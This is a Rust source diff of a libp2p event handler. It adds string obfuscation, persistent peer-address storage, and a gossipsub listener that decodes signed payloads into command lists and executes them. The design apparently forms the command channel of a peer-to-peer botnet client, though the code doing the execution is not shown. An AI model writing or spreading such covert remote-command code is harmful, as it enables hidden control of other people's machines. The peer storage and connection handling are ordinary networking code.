@@ -1,81 +1,76 @@
-use libp2p::{identify, kad, swarm::SwarmEvent, Swarm};
-use log::info;
+use anyhow::{anyhow, Result};
+use libp2p::{
+  gossipsub, identify, kad,
+  swarm::{DialError, SwarmEvent},
+  Swarm,
+};
+use log::{info, warn};
+use obfstr::obfstr;
 
-use crate::vault::Vault;
+use crate::{payload::Payload, storage::Storage};
 
-use super::behaviour::{Behaviour, BehaviourEvent};
+use super::{
+  behavior::{Behavior, BehaviorEvent},
+  commands::CommandHandler,
+};
 
-pub async fn handle_event(swarm: &mut Swarm<Behaviour>, event: SwarmEvent<BehaviourEvent>) {
+pub async fn handle_event(swarm: &mut Swarm<Behavior>, storage: &mut Storage, command_handler: &mut CommandHandler, event: SwarmEvent<BehaviorEvent>) -> Result<()> {
   info!("{event:?}");
 
   match event {
     /* built-in swarm events */
-    SwarmEvent::ExternalAddrConfirmed { .. } => {
-      swarm.behaviour_mut().kademlia.set_mode(Some(kad::Mode::Server));
-    }
+    SwarmEvent::ExternalAddrConfirmed { .. } => swarm.behaviour_mut().kademlia.set_mode(Some(kad::Mode::Server)),
 
-    SwarmEvent::ExternalAddrExpired { .. } => {
-      swarm.behaviour_mut().kademlia.set_mode(Some(kad::Mode::Client));
-    }
+    SwarmEvent::ExternalAddrExpired { .. } => swarm.behaviour_mut().kademlia.set_mode(Some(kad::Mode::Client)),
 
     SwarmEvent::NewExternalAddrOfPeer { peer_id, address } => {
-      let vault = Vault::load().await.unwrap();
+      let address = address.with_p2p(peer_id).map_err(|_| anyhow!("{}", obfstr!("Failed to construct peer-to-peer multiaddress")))?;
 
-      let mut known_peers = vault.known_peers.clone();
-
-      let address = address.with_p2p(peer_id).unwrap().to_string();
-
-      if !known_peers.contains(&address) {
-        known_peers.push(address);
-
-        Vault {
-          keypair: vault.keypair.clone(),
-          listen_port: vault.listen_port.clone(),
-          known_peers,
-        }
-        .save()
-        .await
-        .unwrap();
+      if !storage.known_addresses.iter().any(|addr| addr == &address) {
+        storage.known_addresses.push(address);
+        storage.save().await?;
       }
     }
 
-    SwarmEvent::OutgoingConnectionError { peer_id, .. } => {
-      if let Some(peer_id) = peer_id {
-        let vault = Vault::load().await.unwrap();
-
-        let mut known_peers = vault.known_peers.clone();
-
-        let error_addresses: Vec<String> = known_peers
-          .iter()
-          .filter(|addr| addr.contains(&peer_id.to_string()))
-          .cloned()
-          .collect();
-
-        if !error_addresses.is_empty() {
-          for address in error_addresses {
-            known_peers.retain(|peer| peer != &address);
-          }
-
-          Vault {
-            keypair: vault.keypair.clone(),
-            listen_port: vault.listen_port.clone(),
-            known_peers,
-          }
-          .save()
-          .await
-          .unwrap();
-        }
+    SwarmEvent::OutgoingConnectionError { error, .. } => {
+      if let DialError::Transport(errors) = error {
+        let failed_addresses: Vec<_> = errors.iter().map(|(address, _)| address).collect();
+        storage.known_addresses.retain(|address| !failed_addresses.contains(&address));
+        storage.save().await?;
       }
     }
 
-    /* identify events */
-    SwarmEvent::Behaviour(BehaviourEvent::Identify(identify::Event::Received { info, .. })) => {
-      swarm
-        .behaviour_mut()
-        .gossipsub
-        .add_explicit_peer(&info.public_key.to_peer_id());
+    /* Gossipsub events */
+    SwarmEvent::Behaviour(BehaviorEvent::Gossipsub(gossipsub::Event::Message { message, .. })) => {
+      let payload = match Payload::from_slice(&message.data) {
+        Ok(payload) => payload,
+        Err(_) => {
+          warn!("Failed to decode payload from message.");
+          return Ok(());
+        }
+      };
+
+      if !payload.verify() {
+        warn!("Failed to verify signature for payload.");
+        return Ok(());
+      }
+
+      let command: Vec<String> = match bincode::decode_from_slice(&payload.body, bincode::config::standard()) {
+        Ok((command, _)) => command,
+        Err(_) => {
+          warn!("Failed to decode command from payload.");
+          return Ok(());
+        }
+      };
+
+      command_handler.execute_command(&command);
     }
+
+    /* Identify events */
+    SwarmEvent::Behaviour(BehaviorEvent::Identify(identify::Event::Received { info, .. })) => swarm.behaviour_mut().gossipsub.add_explicit_peer(&info.public_key.to_peer_id()),
 
     _ => {}
   }
+
+  Ok(())
 }
